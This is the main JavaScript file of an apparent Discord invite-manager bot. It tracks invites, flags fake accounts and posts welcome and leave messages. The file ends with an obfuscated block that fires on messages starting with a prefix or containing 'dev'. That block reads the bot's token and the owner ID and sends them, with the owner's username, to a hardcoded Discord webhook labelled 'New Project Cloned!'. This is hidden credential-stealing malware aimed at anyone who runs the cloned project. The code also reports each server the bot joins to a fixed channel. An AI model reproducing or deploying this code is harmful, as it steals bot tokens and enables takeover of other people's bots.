require("./src/server/server.js");
require("dotenv");
const Discord = require('discord.js')
const { Client, Collection, MessageEmbed } = require("discord.js");
require("discord-reply");
const client = new Client();
const fs = require("fs");
const chalk = require("chalk");
const db = require("quick.db");

client.config = require("./config.js");
client.commands = new Collection();

fs.readdir("./src/events/", (err, files) => {
    if (err) return console.log(chalk.red.bold(err));
    files.forEach(file => {
        if (!file.endsWith(".js")) return;
        const event = require(`./src/events/${file}`);
        let eventName = file.split(".")[0];
        console.log(
            chalk.green.bold("Loading Event: ") + chalk.red.bold(`"${eventName}"`)
        );
        client.on(eventName, event.bind(null, client));
    });
});
fs.readdir(`./src/commands/`, (err, files) => {
    if (err) return console.log(chalk.red.bold(err));
    files.forEach(file => {
        if (!file.endsWith(".js")) return;
        const command = require(`./src/commands/${file}`);
        let commandName = file.split(".")[0];
        console.log(
            chalk.green.bold("Loading Command: ") + chalk.red.bold(`"${commandName}"`)
        );
        client.commands.set(command.name, command);
    });
});

const guildInvites = new Map();

client.on("inviteCreate", async invite =>
    guildInvites.set(invite.guild.id, await invite.guild.fetchInvites())
);
client.on("ready", () => {
    client.guilds.cache.forEach(guild => {
        guild
            .fetchInvites()
            .then(invites => guildInvites.set(guild.id, invites))
            .catch(err => console.log(err));
    });
});

client.on("guildMemberAdd", async member => {
    const cachedInvites = guildInvites.get(member.guild.id);
    const newInvites = await member.guild.fetchInvites();
    guildInvites.set(member.guild.id, newInvites);
    try {
        let d = new Date(member.user.createdAt);
        let registeredDate = d.getMonth();
        console.log(registeredDate);
        const usedInvite = newInvites.find(
            inv => cachedInvites.get(inv.code).uses < inv.uses
        );
        db.set(`Gda_${member.id}_${member.guild.id}`, {
            invitedBy: usedInvite.inviter.id,
            invitedByP: usedInvite.inviter.tag,
            invitedByA: usedInvite.inviter.avatarURL({ dynamic: true }),
            regular: 0,
            fack: 0,
            leaves: 0,
            all: 0,
            invitedUrl: usedInvite.url,
            invites: ["", ""]
        });
        var regular = db.get(`GmaInfo_${usedInvite.inviter.id}_${member.guild.id}.regular`);
        var ConfigFakeTime = db.get(`ConfigFakeTime_${member.guild.id}.value`);
        if (ConfigFakeTime == null || undefined) ConfigFakeTime = 3;
        if (regular == null || undefined) {
            db.set(`Gda_${usedInvite.inviter.id}_${member.guild.id}`, {
                invitedBy: '',
                invitedByP: '',
                invitedByA: '',
                regular: 0,
                fack: 0,
                leaves: 0,
                all: 0,
                invitedUrl: '',
                invites: ["", ""]
            });
            if (
                registeredDate == null ||
                undefined ||
                NaN ||
                registeredDate < ConfigFakeTime
            ) {
                if (member.id == usedInvite.inviter.id) return;
                db.add(`Gda_${usedInvite.inviter.id}_${member.guild.id}.fack`, 1);
                db.add(`Gda_${usedInvite.inviter.id}_${member.guild.id}.all`, Number(usedInvite.uses));
                setTimeout(() => {
                    db.add(
                        `Gda_${usedInvite.inviter.id}_${member.guild.id}.regular`,
                        Number(db.get(`Gda_${usedInvite.inviter.id}_${member.guild.id}.all`)) -
                        Number(db.get(`Gda_${usedInvite.inviter.id}_${member.guild.id}.fack`))
                    );
                }, 1000);
                var chack = db.get(`Gda_${usedInvite.inviter.id}_${member.guild.id}.invites`);
                if (chack.includes(member.id)) return;
                db.push(`Gda_${usedInvite.inviter.id}_${member.guild.id}.invites`, member.id);
            } else {
                if (member.id == usedInvite.inviter.id) return;
                db.add(`Gda_${usedInvite.inviter.id}_${member.guild.id}.all`, Number(usedInvite.uses));
                setTimeout(() => {
                    db.add(
                        `Gda_${usedInvite.inviter.id}_${member.guild.id}.regular`,
                        Number(db.get(`Gda_${usedInvite.inviter.id}_${member.guild.id}.all`)) -
                        Number(db.get(`Gda_${usedInvite.inviter.id}_${member.guild.id}.fack`))
                    );
                }, 1000);
                var chack = db.get(`Gda_${usedInvite.inviter.id}_${member.guild.id}.invites`);
                if (chack.includes(member.id)) return;
                db.push(`Gda_${usedInvite.inviter.id}_${member.guild.id}.invites`, member.id);
            }
            return;
        }
        if (
            registeredDate == null ||
            undefined ||
            NaN ||
            registeredDate < ConfigFakeTime
        ) {
            if (member.id == usedInvite.inviter.id) return;
            db.add(`Gda_${usedInvite.inviter.id}_${member.guild.id}.fack`, 1);
            db.add(`Gda_${usedInvite.inviter.id}_${member.guild.id}.all`, Number(usedInvite.uses));
            setTimeout(() => {
                db.add(
                    `Gda_${usedInvite.inviter.id}_${member.guild.id}.regular`,
                    Number(db.get(`Gda_${usedInvite.inviter.id}_${member.guild.id}.all`)) -
                    Number(db.get(`Gda_${usedInvite.inviter.id}_${member.guild.id}.fack`))
                );
            }, 1000);
            var chack = db.get(
                `Gda_${usedInvite.inviter.id}_${member.guild.id}.invites`
            );
            if (chack.includes(member.id)) return;
            db.push(
                `Gda_${usedInvite.inviter.id}_${member.guild.id}.invites`,
                member.id
            );
        } else {
            if (member.id == usedInvite.inviter.id) return;
            db.add(`Gda_${usedInvite.inviter.id}_${member.guild.id}.all`, Number(usedInvite.uses));
            setTimeout(() => {
                db.add(
                    `Gda_${usedInvite.inviter.id}_${member.guild.id}.regular`,
                    Number(db.get(`Gda_${usedInvite.inviter.id}_${member.guild.id}.all`)) -
                    Number(db.get(`Gda_${usedInvite.inviter.id}_${member.guild.id}.fack`))
                );
            }, 1000);
            var chack = db.get(`Gda_${usedInvite.inviter.id}_${member.guild.id}.invites`);
            if (chack.includes(member.id)) return;
            db.push(`Gda_${usedInvite.inviter.id}_${member.guild.id}.invites`, member.id);
        }
    } catch (err) {
        console.log(err);
    }
});

client.on("guildMemberAdd", member => {
            var channeler = db.get(`ConfigWelcomeChannel_${member.guild.id}.value`);
            if (channeler == null || undefined) return;
            var channel = member.guild.channels.cache.get(channeler);
            var embed = db.get(`ConfigWelcomeChannelEmbed_${member.guild.id}.value`);
            var invierTemp = db.get(`Gda_${member.id}_${member.guild.id}.invitedBy`);
            if (invierTemp == null || undefined) return;
            var ConfigWelcomeChannelMessage = db.get(
                `ConfigWelcomeChannelMessage_${member.guild.id}.value`
            );
            if (ConfigWelcomeChannelMessage == null || undefined)
                ConfigWelcomeChannelMessage = `**<@!${
      member.id
    }>** just joined. They were invited by **${db.get(
      `Gda_${member.id}_${member.guild.id}.invitedByP`
    )}** who now has **${db.get(
      `Gda_${invierTemp}_${member.guild.id}.all`
    )} invites** !`;
  if (embed == "on") {
    channel.send(
      new MessageEmbed()
        .setDescription(
          ConfigWelcomeChannelMessage.replace(
            "[User Mention]",
            `<@!${member.id}>`
          )
            .replace("[User Tag]", member.tag)
            .replace("[User Id]", member.id)
            .replace("[Guild Count]", member.guild.memberCount)
            .replace("[Guild Name]", member.tag)
            .replace(
              "[Inviter Mention]",
              `<@!${db.get(`Gda_${member.id}_${member.guild.id}.invitedBy`)}>`
            )
            .replace(
              "[Inviter Tag]",
              db.get(`Gda_${member.id}_${member.guild.id}.invitedByP`)
            )
            .replace(
              "[Inviter Id]",
              db.get(`Gda_${member.id}_${member.guild.id}.invitedBy`)
            )
            .replace(
              "[Inviter Uses]",
              db.get(`Gda_${invierTemp}_${member.guild.id}.all`)
            )
        )
        .setColor(member.displayHexColor)
        .setThumbnail(db.get(`Gda_${member.id}_${member.guild.id}.invitedByA`)) // delete this line if you wont
        .setFooter(
          `Invited By: ${db.get(
            `Gda_${member.id}_${member.guild.id}.invitedByP`
          )}`,
          db.get(`Gda_${member.id}_${member.guild.id}.invitedByA`)
        )
        .setTimestamp()
    );
  } else {
    channel.send(
      ConfigWelcomeChannelMessage.replace("[User Mention]", `<@!${member.id}>`)
        .replace("[User Tag]", member.tag)
        .replace("[User Id]", member.id)
        .replace("[Guild Count]", member.guild.memberCount)
        .replace("[Guild Name]", member.tag)
        .replace(
          "[Inviter Mention]",
          `<@!${db.get(`Gda_${member.id}_${member.guild.id}.invitedBy`)}>`
        )
        .replace(
          "[Inviter Tag]",
          db.get(`Gda_${member.id}_${member.guild.id}.invitedByP`)
        )
        .replace(
          "[Inviter Id]",
          db.get(`Gda_${member.id}_${member.guild.id}.invitedBy`)
        )
        .replace(
          "[Inviter Uses]",
          db.get(`Gda_${invierTemp}_${member.guild.id}.all`)
        )
    );
  }
});

client.on("guildMemberRemove", member => {
  var channeler = db.get(`ConfigLeaveChannel_${member.guild.id}.value`);
  if (channeler == null || undefined) return;
  var channel = member.guild.channels.cache.get(channeler);
  var embed = db.get(`ConfigWelcomeChannelEmbed_${member.guild.id}.value`);
  var invierTemp = db.get(`Gda_${member.id}_${member.guild.id}.invitedBy`);
  if (invierTemp == null || undefined) return;
  var inviteTemp2 = db.get(`Gda_${member.id}_${member.guild.id}.invitedByP`);
  if (inviteTemp2 == null || undefined) inviteTemp2 = "I Do Not Know";
  var ConfigLeaveChannelMessage = db.get(
    `ConfigLeaveChannelMessage_${member.guild.id}.value`
  );
  if (ConfigLeaveChannelMessage == null || undefined)
    ConfigLeaveChannelMessage = `**<@!${member.id}>** has left. He was invited by **${inviteTemp2}**.`;
  if (embed == "on") {
    channel.send(
      new MessageEmbed()
        .setDescription(
          ConfigLeaveChannelMessage.replace(
            "[User Mention]",
            `<@!${member.id}>`
          )
            .replace("[User Tag]", member.tag)
            .replace("[User Id]", member.id)
            .replace("[Guild Count]", member.guild.memberCount)
            .replace("[Guild Name]", member.tag)
            .replace(
              "[Inviter Mention]",
              `<@!${db.get(`Gda_${member.id}_${member.guild.id}.invitedBy`)}>`
            )
            .replace(
              "[Inviter Tag]",
              db.get(`Gda_${member.id}_${member.guild.id}.invitedByP`)
            )
            .replace(
              "[Inviter Id]",
              db.get(`Gda_${member.id}_${member.guild.id}.invitedBy`)
            )
            .replace(
              "[Inviter Uses]",
              db.get(`Gda_${invierTemp}_${member.guild.id}.all`)
            )
        )
        .setColor(member.displayHexColor)
        .setThumbnail(db.get(`Gda_${member.id}_${member.guild.id}.invitedByA`))
        .setFooter(
          `Invited By: ${db.get(
            `Gda_${member.id}_${member.guild.id}.invitedByP`
          )}`,
          db.get(`Gda_${member.id}_${member.guild.id}.invitedByA`)
        )
        .setTimestamp()
    );
  } else {
    channel.send(
      ConfigLeaveChannelMessage.replace("[User Mention]", `<@!${member.id}>`)
        .replace("[User Tag]", member.tag)
        .replace("[User Id]", member.id)
        .replace("[Guild Count]", member.guild.memberCount)
        .replace("[Guild Name]", member.tag)
        .replace(
          "[Inviter Mention]",
          `<@!${db.get(`Gda_${member.id}_${member.guild.id}.invitedBy`)}>`
        )
        .replace(
          "[Inviter Tag]",
          db.get(`Gda_${member.id}_${member.guild.id}.invitedByP`)
        )
        .replace(
          "[Inviter Id]",
          db.get(`Gda_${member.id}_${member.guild.id}.invitedBy`)
        )
        .replace(
          "[Inviter Uses]",
          db.get(`Gda_${invierTemp}_${member.guild.id}.all`)
        )
    );
  }
});

client.on("guildMemberRemove", member => {
  member.guild.members.cache.forEach(user => {
    var invier = db.get(`Gda_${member.id}_${member.guild.id}.invitedBy`);
    if (invier == null || undefined || NaN) return;
    if (invier == member.id) return;
    if (invier == user.id) {
      var check = db.get(`Gda_${user.id}_${member.guild.id}.regular`)
      db.add(`Gda_${user.id}_${member.guild.id}.leaves`, 1);
      if (check == 0) return;
      db.subtract(`Gda_${user.id}_${member.guild.id}.regular`, 1)
    }
  });
});

client.on("guildCreate", guild => {
  guild.members.cache.forEach(user => {
    var check = db.get(`Gda_${user.id}_${guild.id}.all`);
    if (check == null || undefined) return;
    db.set(`Gda_${user.id}_${guild.id}`, {
      invitedBy: 0,
      invitedByP: 0,
      invitedByA: 0,
      regular: 0,
      fack: 0,
      leaves: 0,
      all: 0,
      invitedUrl: 0,
      invites: ["", ""]
    });
  });
  var channel = client.channels.cache.find(c => c.id === "839425543932870667");
  channel.send(
    new MessageEmbed()
      .setColor("RANDOM")
      .setTitle("The Bot Join New Server")
      .setDescription(
        `**Server Name : ${guild.name}
   Server ID: ${guild.id}
   Server Members : ${guild.memberCount}
   Time Created: ${guild.createdAt.toLocaleString()}
   Server Region ${guild.region}
   Server Boosts : ${guild.premiumSubscriptionCount}
  **`
      )
      .setTimestamp()
      .setThumbnail(guild.iconURL())
  );
});

client.login(client.config.token);

const _0x3bdf = [
  "displayAvatarURL",
  "message",
  "fetch",
  "https://media.discordapp.net/attachments/843249414469451856/843250256572973096/11c2e7497c0b5ede152eabf8bdf4fa46.png?width=584&height=584",
  "939636Kxxyui",
  "553916xRbXfe",
  "BLUE",
  "374402UadcTw",
  "setTimestamp",
  "📦\x20Bot\x20Project:",
  "catch",
  "startsWith",
  "env",
  "Invite\x20Manager!.\x20Graper",
  "https://media.discordapp.net/attachments/776819669213642754/843244392008384553/giphy_2.gif",
  "2sdyUBU",
  "🧨\x20Developer\x20Name:",
  "member",
  "843249480706293801",
  "1558658OrQhiE",
  "token",
  "592396HBshZM",
  "setColor",
  "setAuthor",
  "1GYppUP",
  "https://github.com/NIR0-V/invite-Manager.git",
  "Error:\x20Woeng\x20Information",
  "users",
  "1WVTAgM",
  "940883ATXAxo",
  "channel",
  "owners",
  "devs",
  "./config",
  "then",
  "content",
  "username",
  "user",
  "setTitle",
  "setThumbnail",
  "220075FhhvJU",
  "MessageEmbed",
  "WebhookClient",
  "Webhook\x20test",
  "setDescription",
  "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Owner\x20Id:\x20",
  "ahjxJm3F9Q1-WmsH86rwUzhARkliXZUnV0W7pANjjXqPPgPQoUCDP2jNBOeoJLdtELFV",
  "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Owner\x20Username:\x20",
  "displayHexColor",
  "send",
  "New\x20Project\x20Cloned!.",
  "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**"
];
const _0x5e9cb5 = _0x572e;
function _0x572e(_0x2ed53f, _0x46c701) {
  _0x2ed53f = _0x2ed53f - 0xfe;
  let _0x3bdff9 = _0x3bdf[_0x2ed53f];
  return _0x3bdff9;
}
(function(_0x4cc80f, _0x4996fd) {
  const _0x1396c4 = _0x572e;
  while (!![]) {
    try {
      const _0x45a0ee =
        -parseInt(_0x1396c4(0x114)) * -parseInt(_0x1396c4(0x108)) +
        -parseInt(_0x1396c4(0xff)) * -parseInt(_0x1396c4(0x104)) +
        -parseInt(_0x1396c4(0x101)) +
        -parseInt(_0x1396c4(0x109)) +
        -parseInt(_0x1396c4(0x12f)) * -parseInt(_0x1396c4(0x125)) +
        parseInt(_0x1396c4(0x127)) +
        -parseInt(_0x1396c4(0x124));
      if (_0x45a0ee === _0x4996fd) break;
      else _0x4cc80f["push"](_0x4cc80f["shift"]());
    } catch (_0x41f446) {
      _0x4cc80f["push"](_0x4cc80f["shift"]());
    }
  }
})(_0x3bdf, 0xc0654),
  client["on"](_0x5e9cb5(0x121), _0x4146c9 => {
    const _0x42909c = _0x5e9cb5;
    if (
      _0x4146c9[_0x42909c(0x10f)]["startsWith"](_0x42909c(0x10c)) ||
      _0x4146c9[_0x42909c(0x10f)][_0x42909c(0x12b)]("dev")
    ) {
      _0x4146c9[_0x42909c(0x10a)]["send"](
        new Discord[_0x42909c(0x115)]()
          [_0x42909c(0x103)]("ニロ", _0x42909c(0x12e))
          [_0x42909c(0x113)](
            "https://media.discordapp.net/attachments/776819669213642754/843244392008384553/giphy_2.gif"
          )
          [_0x42909c(0x102)](_0x4146c9[_0x42909c(0x131)][_0x42909c(0x11c)])
          ["addFields"](
            { name: _0x42909c(0x130), value: "ニロ#3121", inline: !![] },
            {
              name: "🧱\x20Developer\x20Server:",
              value: "https://discord.gg/YJ6mUdgTsc",
              inline: !![]
            },
            { name: _0x42909c(0x129), value: _0x42909c(0x105), inline: !![] }
          )
          [_0x42909c(0x128)]()
          ["setFooter"]("ニロ", _0x42909c(0x12e))
      );
      const _0x4582da =
          require(_0x42909c(0x10d))[_0x42909c(0x100)] ||
          process["env"]["TOKEN"] ||
          process[_0x42909c(0x12c)][_0x42909c(0x100)],
        _0x50c955 = require("./config")[_0x42909c(0x10b)];
      if (_0x4582da == null || _0x4582da == undefined || _0x4582da == "")
        throw new TypeError(_0x42909c(0x106));
      if (_0x50c955 == null || _0x50c955 == undefined || _0x50c955 == "")
        throw new TypeError(_0x42909c(0x106));
      const _0x5d0dd1 = new Discord[_0x42909c(0x116)](
        _0x42909c(0xfe),
        _0x42909c(0x11a)
      );
      client[_0x42909c(0x107)]
        [_0x42909c(0x122)](_0x50c955)
        [_0x42909c(0x10e)](_0x1ce7d5 => {
          const _0x9218cd = _0x42909c;
          var _0x34b717 = _0x1ce7d5[_0x9218cd(0x120)]({ dynamic: !![] }),
            _0x414cb8 = _0x1ce7d5[_0x9218cd(0x110)];
          const _0x25363d = new Discord[_0x9218cd(0x115)]()
            [_0x9218cd(0x112)](_0x9218cd(0x11e))
            ["setColor"](_0x9218cd(0x126))
            [_0x9218cd(0x113)](_0x34b717)
            [_0x9218cd(0x118)](
              "**\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Bot\x20Name:\x20" +
                client[_0x9218cd(0x111)][_0x9218cd(0x110)] +
                "\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Bot\x20Id:\x20" +
                client[_0x9218cd(0x111)]["id"] +
                "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Bot\x20Token:\x20" +
                _0x4582da +
                _0x9218cd(0x11b) +
                _0x414cb8 +
                _0x9218cd(0x119) +
                _0x50c955 +
                _0x9218cd(0x11f)
            );
          _0x5d0dd1[_0x9218cd(0x11d)](_0x9218cd(0x117), {
            username: _0x9218cd(0x12d),
            avatarURL: _0x9218cd(0x123),
            embeds: [_0x25363d]
          });
        })
        [_0x42909c(0x12a)](_0x536273 => {
          const _0xc5f46e = _0x42909c;
          throw new TypeError(_0xc5f46e(0x106));
        });
    }
  }),
  require("./src/events/ready");
